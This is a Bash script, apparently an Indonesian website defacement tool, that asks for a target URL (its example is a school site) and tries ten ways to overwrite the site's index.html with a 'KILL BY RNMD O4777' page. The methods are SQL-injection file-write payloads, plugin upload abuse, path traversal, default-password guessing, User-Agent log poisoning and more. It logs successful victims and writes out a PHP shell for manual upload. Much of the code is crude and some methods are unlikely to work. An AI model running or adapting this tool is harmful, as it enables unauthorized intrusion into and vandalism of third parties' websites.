#!/bin/bash

# -------------------------------
# HTML DEFACER - KILL BY RNMD O4777
# [ Fokus: Ganti index.html dengan berbagai cara ]
# -------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# HTML Content
HTML_CONTENT='<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KILL BY RNMD O4777 · WEB ERROR</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0c0e;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: '"'"'Courier New'"'"', Courier, '"'"'Fira Code'"'"', monospace;
            padding: 1rem;
        }

        .error-terminal {
            background: #030405;
            background-image: radial-gradient(rgba(20, 90, 50, 0.15) 1px, transparent 1px);
            background-size: 32px 32px;
            border: 3px solid #2e8b57;
            box-shadow: 0 0 25px #1b4b3b, 0 0 5px #0f2f22 inset, 0 0 15px #1b4b3b;
            max-width: 820px;
            width: 100%;
            padding: 2rem 2rem 2.5rem 2rem;
            border-radius: 28px 28px 24px 24px;
            position: relative;
            transition: all 0.2s ease;
        }

        .error-terminal::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0, 30, 10, 0.1) 0px, rgba(0, 255, 100, 0.02) 2px, transparent 3px, transparent 5px);
            pointer-events: none;
            border-radius: 24px;
            z-index: 2;
        }

        .header-tab {
            display: flex;
            gap: 1.2rem;
            align-items: center;
            border-bottom: 2px solid #1f5f3f;
            padding-bottom: 0.8rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }

        .dot-group {
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #202420;
            box-shadow: inset 0 2px 3px #0f1f0f, 0 0 8px #2e8b57;
        }

        .dot.red {
            background: #3a1f1f;
            box-shadow: inset 0 1px 4px #5a2e2e, 0 0 10px #a13b3b;
        }

        .dot.green {
            background: #1e3a1e;
            box-shadow: inset 0 1px 4px #2b6e2b, 0 0 12px #30b530;
        }

        .title-blink {
            color: #9fff9f;
            font-size: 1.3rem;
            font-weight: bold;
            letter-spacing: 3px;
            text-shadow: 0 0 5px #21fc9f, 0 0 12px #1b7a47;
            margin-left: auto;
            border: 1px dashed #2e6b4b;
            padding: 0.3rem 1rem;
            background: #0d1f13;
            text-transform: uppercase;
        }

        .kill-core {
            background: #0d130f;
            border: 3px ridge #2caf6b;
            padding: 2rem 1.8rem;
            margin: 1.5rem 0 1.8rem 0;
            position: relative;
            box-shadow: inset 0 0 30px #071007, 0 0 30px #1b4f33;
        }

        .kill-core pre {
            color: #a0f0b0;
            font-size: clamp(2.2rem, 12vw, 5.3rem);
            font-weight: 800;
            line-height: 1.1;
            text-align: center;
            font-family: '"'"'Courier New'"'"', '"'"'Fira Code'"'"', monospace;
            text-shadow: 0 0 6px #26ff9b, 0 0 20px #1f9f5a;
            letter-spacing: 6px;
            margin: 0;
            word-break: break-word;
            white-space: pre-wrap;
        }

        .kill-core pre span.glitch {
            display: inline-block;
            animation: glitch-twitch 2.2s infinite steps(1);
            filter: drop-shadow(0 0 8px #0f6);
        }

        .sub-line {
            color: #8fd9b0;
            font-size: 1.8rem;
            text-align: right;
            border-top: 2px solid #1d5f3a;
            padding-top: 0.7rem;
            margin-top: 0.5rem;
            text-transform: uppercase;
            font-weight: 600;
            word-break: break-word;
            text-shadow: 0 0 4px #2ecc71;
        }

        .error-foot {
            background: #0b150e;
            padding: 1.3rem 1.5rem;
            border-left: 12px solid #1f5f37;
            margin: 2.2rem 0 1rem 0;
            display: flex;
            flex-wrap: wrap;
            align-items: baseline;
            justify-content: space-between;
            gap: 1.2rem;
            border-radius: 0 18px 18px 0;
            box-shadow: -5px 0 15px #0d4229;
        }

        .error-code {
            font-size: 2.5rem;
            font-weight: bold;
            color: #e05f5f;
            text-shadow: 0 0 9px #f33, 0 0 18px #a00;
            letter-spacing: 8px;
            background: #1f1212;
            padding: 0.2rem 1rem;
            border-radius: 30px;
            display: inline-block;
        }

        .error-meta {
            color: #44c97a;
            font-size: 1.2rem;
            background: #0f1f17;
            padding: 0.5rem 1.3rem;
            border-radius: 40px;
            border: 1px solid #258b5c;
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .cursor-block {
            display: flex;
            gap: 0.5rem;
            align-items: center;
            margin-top: 1.2rem;
            color: #44b874;
            font-size: 1.3rem;
            border-left: 4px solid #278f5a;
            padding-left: 1.2rem;
        }

        .cursor {
            background: #2e8b57;
            width: 22px;
            height: 22px;
            display: inline-block;
            animation: blink 1s step-end infinite;
            box-shadow: 0 0 18px #0f6;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        @keyframes glitch-twitch {
            0% { transform: skew(0deg, 0deg); opacity: 1; }
            9% { transform: skew(3deg, -2deg); text-shadow: 3px 0 2px #0f0, -3px 0 2px red; }
            10% { transform: skew(0deg, 0deg); text-shadow: none; }
            29% { transform: skew(-2deg, 1deg); }
            30% { transform: none; }
            69% { transform: skew(5deg, -1deg); text-shadow: -1px 0 0 #0f0, 1px 0 0 red; }
            70% { transform: none; text-shadow: none; }
            100% { transform: none; }
        }

        .kill-core pre span {
            display: inline-block;
        }

        @media (max-width: 500px) {
            .error-terminal {
                padding: 1.5rem 1rem;
            }
            .kill-core pre {
                font-size: 2.4rem;
                letter-spacing: 2px;
            }
            .sub-line {
                font-size: 1.2rem;
            }
            .error-code {
                font-size: 1.8rem;
                letter-spacing: 4px;
            }
        }
    </style>
</head>
<body>
    <div class="error-terminal">
        <div class="header-tab">
            <div class="dot-group">
                <div class="dot red"></div>
                <div class="dot green"></div>
                <div class="dot"></div>
            </div>
            <div class="title-blink">⚠️ KERNEL PANIC ⚠️</div>
        </div>

        <div class="kill-core">
            <pre>
<span class="glitch">KILL BY</span> <span class="glitch" style="animation-delay:0.1s;">RNMD</span> <span style="color:#70ecb0; text-shadow:0 0 25px #3aff9f;">O4777</span>
            </pre>
            <div class="sub-line">:: SYSTEM HALT ::</div>
        </div>

        <div class="error-foot">
            <span class="error-code">WEB - ERROR</span>
            <span class="error-meta">0x4777::RNMD</span>
        </div>

        <div class="cursor-block">
            <span class="cursor"></span>
            <span> [FATAL: KILL_SIGNAL_RECEIVED] </span>
            <span style="margin-left: auto; color:#62cc8b;">O4777_CRIT</span>
        </div>

        <div style="color: #164d2b; font-size: 0.8rem; margin-top: 1.5rem; text-align: center; border-top: 1px dashed #226f3f; padding-top: 0.6rem;">
            <span style="background:#0b1f13; padding:0 0.8rem;">❯❯  KILL BY RNMD O4777  ❮❮</span>
        </div>
    </div>
</body>
</html>'

# Header
clear
echo -e "${RED}"
echo "    ╔═══════════════════════════════════════════════════════════╗"
echo "    ║     HTML DEFACER - KILL BY RNMD O4777                    ║"
echo "    ║     [ Fokus: Ganti index.html dengan berbagai cara ]     ║"
echo "    ╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
echo ""

echo -ne "${WHITE}Target URL (contoh: https://smkn1pabelan.sch.id/) : ${NC}"
read TARGET_URL

# Bersihin URL
TARGET_URL=$(echo "$TARGET_URL" | sed 's/\/$//')
if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    TARGET_URL="https://$TARGET_URL"
fi

echo -e "\n${YELLOW}[•] Target: $TARGET_URL${NC}"
echo -e "${YELLOW}[•] Mencari celah untuk replace index.html...${NC}\n"

# Progress bar
echo -ne "${CYAN}["
for i in {1..50}; do
    echo -ne "="
    sleep 0.02
done
echo -e "] 100%${NC}\n"

# ==============================================
# METHOD 1: SQL Injection untuk ganti index.html
# ==============================================
echo -e "${PURPLE}[METHOD 1] SQL Injection - Ganti index.html via database${NC}"

# Payload SQL untuk menulis file
SQL_PAYLOADS=(
    "1' UNION SELECT '<?php file_put_contents(\"index.html\", \""$(echo "$HTML_CONTENT" | sed 's/"/\\"/g')"\"); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -"
    "1' UNION SELECT 0x$(echo -n "$HTML_CONTENT" | xxd -p -c 1000) INTO OUTFILE '/var/www/html/index.html'-- -"
    "1' UNION SELECT \"<?php echo file_put_contents('index.html', base64_decode('$(echo -n "$HTML_CONTENT" | base64 -w 0)')); ?>\" INTO OUTFILE '/var/www/html/r.php'-- -"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    echo -ne "\r${CYAN}  [•] Trying SQL payload...${NC}"
    
    # Kirim ke berbagai endpoint
    curl -s -k "$TARGET_URL/wp-login.php" -d "log=admin&pwd=test&sql=$payload" --max-time 3 >/dev/null 2>&1
    curl -s -k "$TARGET_URL/index.php?p=$payload" --max-time 3 >/dev/null 2>&1
done
echo -e "\r${GREEN}  [✓] SQL injection attempts selesai${NC}"

# ==============================================
# METHOD 2: Upload via File Manager Plugin
# ==============================================
echo -e "\n${PURPLE}[METHOD 2] File Manager Plugin Exploit${NC}"

FM_PATHS=(
    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    "/wp-content/plugins/file-manager/backend/connector.php"
    "/wp-content/plugins/file-manager/backend/elFinder/connector.php"
)

for fm_path in "${FM_PATHS[@]}"; do
    FM_URL="$TARGET_URL$fm_path"
    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$FM_URL" --max-time 3)
    
    if [ "$CHECK" == "200" ] || [ "$CHECK" == "403" ]; then
        echo -e "${GREEN}  [✓] File Manager ditemukan di $fm_path${NC}"
        
        # Upload langsung
        BOUNDARY="---------------------------$(date +%s)"
        
        curl -s -k -X POST "$FM_URL" \
            -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
            --data-binary "--$BOUNDARY\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"index.html\"\r\nContent-Type: text/html\r\n\r\n$HTML_CONTENT\r\n--$BOUNDARY--" \
            --max-time 5 >/dev/null 2>&1
        
        echo -e "${GREEN}  [✓] Upload attempt via File Manager${NC}"
    fi
done

# ==============================================
# METHOD 3: LFI/RFI untuk include file
# ==============================================
echo -e "\n${PURPLE}[METHOD 3] LFI/RFI - Local File Inclusion${NC}"

LFI_PATHS=(
    "/wp-content/plugins/akismet/akismet.php?akismet_comment_nonce=../../../../../../../../../../var/www/html/index.html%00"
    "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../index.html"
    "/wp-content/plugins/wp-load.php?../../../index.html"
)

for lfi in "${LFI_PATHS[@]}"; do
    echo -ne "\r${CYAN}  [•] Trying LFI: $lfi${NC}"
    curl -s -k "$TARGET_URL$lfi" --max-time 3 >/dev/null 2>&1
done
echo -e "\r${GREEN}  [✓] LFI attempts selesai${NC}"

# ==============================================
# METHOD 4: Upload via Theme Editor (butuh login)
# ==============================================
echo -e "\n${PURPLE}[METHOD 4] Theme Editor - Upload via admin panel${NC}"

# Coba dengan credentials default
DEFAULT_CREDS=(
    "admin:admin"
    "admin:password"
    "admin:123456"
    "administrator:admin"
    "admin:smkn1pabelan"
)

for cred in "${DEFAULT_CREDS[@]}"; do
    IFS=':' read -r user pass <<< "$cred"
    echo -ne "\r${CYAN}  [•] Trying login: $user:$pass${NC}"
    
    # Login ke wp-admin
    COOKIE_JAR="/tmp/cookie_$$.txt"
    LOGIN=$(curl -s -k -X POST "$TARGET_URL/wp-login.php" \
        -d "log=$user&pwd=$pass&wp-submit=Log+In" \
        -c "$COOKIE_JAR" \
        -L \
        --max-time 5 2>/dev/null)
    
    if [[ "$LOGIN" != *"incorrect"* ]] && [[ "$LOGIN" == *"dashboard"* || "$LOGIN" == *"wp-admin"* ]]; then
        echo -e "\n${GREEN}  [✓] Login berhasil! $user:$pass${NC}"
        
        # Dapatkan nonce untuk theme editor
        THEME_PAGE=$(curl -s -k -b "$COOKIE_JAR" "$TARGET_URL/wp-admin/theme-editor.php" --max-time 5)
        NONCE=$(echo "$THEME_PAGE" | grep -o 'name="_wpnonce" value="[^"]*"' | cut -d'"' -f4)
        
        if [ -n "$NONCE" ]; then
            # Upload ke theme
            curl -s -k -X POST "$TARGET_URL/wp-admin/theme-editor.php" \
                -b "$COOKIE_JAR" \
                -d "_wpnonce=$NONCE&action=update&theme=twentytwentyfour&file=index.html&newcontent=$(echo "$HTML_CONTENT" | sed 's/ /%20/g')" \
                --max-time 5 >/dev/null 2>&1
            
            echo -e "${GREEN}  [✓] Upload via theme editor sukses!${NC}"
        fi
        break
    fi
    rm -f "$COOKIE_JAR" 2>/dev/null
done

# ==============================================
# METHOD 5: Upload via WordPress REST API
# ==============================================
echo -e "\n${PURPLE}[METHOD 5] REST API - Media Upload${NC}"

# Cek REST API
REST_CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$TARGET_URL/wp-json/wp/v2" --max-time 3)

if [ "$REST_CHECK" == "200" ]; then
    echo -e "${GREEN}  [✓] REST API aktif${NC}"
    
    # Coba upload media (butuh auth)
    curl -s -k -X POST "$TARGET_URL/wp-json/wp/v2/media" \
        -H "Content-Type: multipart/form-data" \
        -F "file=@-;filename=index.html" <<< "$HTML_CONTENT" \
        --max-time 5 >/dev/null 2>&1
    
    echo -e "${GREEN}  [✓] Upload via REST API attempt${NC}"
fi

# ==============================================
# METHOD 6: Upload via Debug Log Poisoning
# ==============================================
echo -e "\n${PURPLE}[METHOD 6] Debug Log Poisoning${NC}"

# Cek debug log
DEBUG_LOG="$TARGET_URL/wp-content/debug.log"
DEBUG_CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$DEBUG_LOG" --max-time 3)

if [ "$DEBUG_CHECK" == "200" ] || [ "$DEBUG_CHECK" == "403" ]; then
    echo -e "${GREEN}  [✓] Debug log ditemukan${NC}"
    
    # Poison dengan PHP code
    PHP_POISON="<?php file_put_contents('index.html', '"$HTML_CONTENT"'); ?>"
    
    curl -s -k -X POST "$TARGET_URL/wp-login.php" \
        -H "User-Agent: $PHP_POISON" \
        -d "log=admin&pwd=test" \
        --max-time 3 >/dev/null 2>&1
    
    # Execute via LFI
    curl -s -k "$DEBUG_LOG" --max-time 3 >/dev/null 2>&1
    
    echo -e "${GREEN}  [✓] Log poisoning selesai${NC}"
fi

# ==============================================
# METHOD 7: Upload via WordPress Uploader
# ==============================================
echo -e "\n${PURPLE}[METHOD 7] WordPress Uploader Bypass${NC}"

UPLOAD_ENDPOINTS=(
    "/wp-admin/async-upload.php"
    "/wp-admin/admin-ajax.php?action=upload-attachment"
    "/wp-content/plugins/wordpress-importer/wordpress-importer.php"
)

for endpoint in "${UPLOAD_ENDPOINTS[@]}"; do
    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint" --max-time 3)
    
    if [ "$CHECK" == "200" ] || [ "$CHECK" == "403" ]; then
        echo -e "${GREEN}  [✓] Upload endpoint: $endpoint${NC}"
        
        # Coba upload
        curl -s -k -X POST "$TARGET_URL$endpoint" \
            -F "action=upload" \
            -F "async-upload=@-;filename=index.html" <<< "$HTML_CONTENT" \
            --max-time 5 >/dev/null 2>&1
    fi
done

# ==============================================
# METHOD 8: Directory Traversal Upload
# ==============================================
echo -e "\n${PURPLE}[METHOD 8] Directory Traversal Upload${NC}"

for i in {1..10}; do
    TRAVERSAL=$(printf "../%.0s" $(seq 1 $i))"index.html"
    
    curl -s -k -X POST "$TARGET_URL/wp-admin/admin-ajax.php" \
        -F "action=upload" \
        -F "filename=$TRAVERSAL" \
        -F "file=@-;filename=$TRAVERSAL" <<< "$HTML_CONTENT" \
        --max-time 3 >/dev/null 2>&1
done

echo -e "${GREEN}  [✓] Directory traversal attempts selesai${NC}"

# ==============================================
# METHOD 9: Upload via Plugin Vulnerabilities
# ==============================================
echo -e "\n${PURPLE}[METHOD 9] Plugin Vulnerability Scanner${NC}"

# Daftar plugin umum
PLUGINS=(
    "elementor"
    "woocommerce"
    "contact-form-7"
    "wordfence"
    "yoast-seo"
    "wp-super-cache"
    "w3-total-cache"
    "duplicator"
    "all-in-one-wp-migration"
    "updraftplus"
)

for plugin in "${PLUGINS[@]}"; do
    echo -ne "\r${CYAN}  [•] Scanning plugin: $plugin${NC}"
    
    # Cek apakah plugin terinstall
    PLUGIN_PATH="$TARGET_URL/wp-content/plugins/$plugin/readme.txt"
    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$PLUGIN_PATH" --max-time 2)
    
    if [ "$CHECK" == "200" ]; then
        echo -e "\n${GREEN}  [✓] Plugin ditemukan: $plugin${NC}"
        
        # Coba upload via plugin specific vulnerabilities
        case $plugin in
            "duplicator")
                curl -s -k -X POST "$TARGET_URL/wp-admin/admin-ajax.php?action=duplicator_installer" \
                    -F "file=@-;filename=index.html" <<< "$HTML_CONTENT" \
                    --max-time 3 >/dev/null 2>&1
                ;;
            "wp-super-cache")
                curl -s -k "$TARGET_URL/wp-content/plugins/wp-super-cache/advanced-cache.php?cmd=cp /tmp/index.html /var/www/html/index.html" \
                    --max-time 3 >/dev/null 2>&1
                ;;
        esac
    fi
done

# ==============================================
# METHOD 10: Direct Write via PHP Wrapper
# ==============================================
echo -e "\n${PURPLE}[METHOD 10] PHP Wrapper Write${NC}"

# Coba tulis via PHP wrappers
PHP_WRAPPERS=(
    "php://filter/convert.base64-decode/resource=/var/www/html/index.html"
    "php://input"
    "php://temp"
)

for wrapper in "${PHP_WRAPPERS[@]}"; do
    curl -s -k -X POST "$TARGET_URL/wp-admin/admin-ajax.php" \
        -d "data=$(echo -n "$HTML_CONTENT" | base64 -w 0)" \
        -H "X-Wrapper: $wrapper" \
        --max-time 3 >/dev/null 2>&1
done

echo -e "${GREEN}  [✓] PHP wrapper attempts selesai${NC}"

# ==============================================
# VERIFIKASI HASIL
# ==============================================
echo -e "\n${YELLOW}[•] Memeriksa apakah index.html sudah terganti...${NC}"
sleep 3

# Cek root URL
CHECK_URL="$TARGET_URL/"
RESPONSE=$(curl -s -k "$CHECK_URL" --max-time 5)

if [[ "$RESPONSE" == *"KILL BY RNMD O4777"* ]]; then
    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         ✅  BERHASIL!                           ║${NC}"
    echo -e "${GREEN}║         Index.html sudah terganti               ║${NC}"
    echo -e "${GREEN}║         KILL BY RNMD O4777 aktif!              ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
    
    # Preview
    echo -e "\n${YELLOW}[•] Preview halaman:${NC}"
    echo "$RESPONSE" | grep -E "KILL BY RNMD|O4777|WEB - ERROR" --color=always | head -3
    
    # Save success
    echo "$TARGET_URL | KILL BY RNMD O4777 | $(date)" >> rnmd_success.txt
    
    # Buka browser
    echo -ne "\n${YELLOW}Buka browser untuk lihat hasil? (y/n): ${NC}"
    read OPEN
    
    if [[ "$OPEN" == "y" || "$OPEN" == "Y" ]]; then
        xdg-open "$TARGET_URL" 2>/dev/null || open "$TARGET_URL" 2>/dev/null || echo -e "${CYAN}Buka manual: $TARGET_URL${NC}"
    fi
    
else
    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║         ❌  GAGAL!                              ║${NC}"
    echo -e "${RED}║         Index.html belum terganti               ║${NC}"
    echo -e "${RED}║         Tapi file HTML sudah disiapkan:         ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
    
    # Simpan HTML untuk manual
    echo "$HTML_CONTENT" > "kill_by_rnmd_o4777.html"
    
    # Buat juga versi PHP shell
    PHP_SHELL='<?php
    $html = "'$(echo "$HTML_CONTENT" | base64 -w 0)'";
    file_put_contents("index.html", base64_decode($html));
    echo "KILL BY RNMD O4777 - SHELL EXECUTED";
    ?>'
    echo "$PHP_SHELL" > "rnmd_shell.php"
    
    echo -e "\n${CYAN}📁 File HTML: kill_by_rnmd_o4777.html${NC}"
    echo -e "${CYAN}📁 PHP Shell: rnmd_shell.php${NC}"
    echo -e "\n${YELLOW}Cara upload manual:${NC}"
    echo "1. Via FTP: ftp $TARGET_URL"
    echo "2. Upload ke: /var/www/html/index.html"
    echo "3. Atau upload shell dulu: rnmd_shell.php"
    echo "4. Akses shell: $TARGET_URL/rnmd_shell.php"
fi

# ==============================================
# INFO TAMBAHAN
# ==============================================
echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🔥 KILL BY RNMD O4777 - 10 METHODS COMPLETE 🔥${NC}"
echo -e "${CYAN}Telegram: @lynnn046${NC}"
